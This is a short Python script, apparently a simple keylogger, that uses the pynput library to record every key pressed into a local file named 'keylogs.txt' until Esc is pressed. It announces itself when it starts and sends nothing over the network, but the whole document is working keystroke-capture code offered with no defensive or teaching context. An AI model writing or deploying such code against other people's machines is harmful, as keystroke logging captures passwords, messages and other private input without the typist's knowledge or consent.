from pynput.keyboard import Listener, Key

log_file = "keylogs.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

    # Stop program when Esc is pressed
    if key == Key.esc:
        print("Escape detected → Stopping listener.")
        return False   

print("Keylogger is running. Press 'Esc' to stop.")

with Listener(on_press=on_press) as listener:
    listener.join()
